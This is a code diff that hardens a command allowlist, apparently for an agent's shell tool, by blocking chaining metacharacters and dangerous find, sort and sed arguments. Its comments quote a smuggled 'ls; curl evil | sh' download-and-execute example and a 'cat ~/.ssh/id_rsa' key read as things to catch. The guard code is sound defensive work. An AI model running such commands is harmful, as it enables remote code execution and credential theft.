@@ -62,10 +62,46 @@ def is_denied(command: str, denied: list[str]) -> bool:
     return False
 
 
-# Shell metacharacters that chain/substitute commands or redirect output.
+# Shell metacharacters that chain/substitute commands or redirect I/O.
 # A command containing any of these can smuggle arbitrary executables past a
 # prefix match (e.g. "ls; curl evil | sh"), so it never auto-runs.
-_CHAIN_RE = _re.compile(r'[;&|`\n>]|\$\(')
+# '+' is deliberately absent: it is load-bearing in benign commands such as
+# `date +%Y`. The find guard below covers `-exec ... +` instead.
+_CHAIN_RE = _re.compile(r'[;&|`\n<>]|\$\(')
+
+# Allowlisting by executable name alone is not enough: several ordinary tools
+# are general-purpose command executors or file mutators once you look at their
+# arguments. `find -delete`, `sed -i` and `sort -o` all write, and `find -exec`
+# runs anything at all — none of which need a shell metacharacter, so _CHAIN_RE
+# never sees them.
+#
+# Tools whose *whole purpose* is running another command (awk via system(),
+# xargs, and the network mutators ip/ifconfig) are not allowlisted at all —
+# see allowed_commands.txt. The ones below are useful read-only, so they stay
+# allowlisted with their dangerous argument forms carved out.
+_ARG_GUARDS = {
+    # -exec/-execdir/-ok/-okdir run arbitrary commands; -delete removes files;
+    # -fls/-fprint/-fprintf write to arbitrary paths.
+    "find": _re.compile(
+        r'(?:^|\s)-(?:exec|execdir|ok|okdir|delete|fls|fprint|fprintf)\b'
+    ),
+    # -o/--output writes the result to an arbitrary path.
+    "sort": _re.compile(r'(?:^|\s)(?:-o|--output)\b'),
+    # Retained for defence in depth: sed is not allowlisted, but a user who
+    # adds it back should not silently gain in-place editing.
+    "sed": _re.compile(r'(?:^|\s)(?:-i|--in-place)'),
+}
+
+
+def _guarded_arg(command: str) -> bool:
+    """True when an allowlisted tool is being used in its dangerous form."""
+    tokens = command.strip().split()
+    if not tokens:
+        return False
+    # Compare on the basename so /usr/bin/find is guarded like find.
+    exe = tokens[0].rsplit("/", 1)[-1]
+    guard = _ARG_GUARDS.get(exe)
+    return bool(guard and guard.search(command))
 
 # References to credential stores force confirmation even for allowlisted
 # commands (e.g. "cat ~/.ssh/id_rsa" must not run silently).
@@ -79,6 +115,8 @@ _SENSITIVE_PATH_RE = _re.compile(
 def is_allowed(command: str, allowed: list[str]) -> bool:
     cmd = command.strip()
     if _CHAIN_RE.search(cmd) or _SENSITIVE_PATH_RE.search(cmd):
+        return False
+    if _guarded_arg(cmd):
         return False
     for pattern in allowed:
         if cmd == pattern or cmd.startswith(pattern + " "):
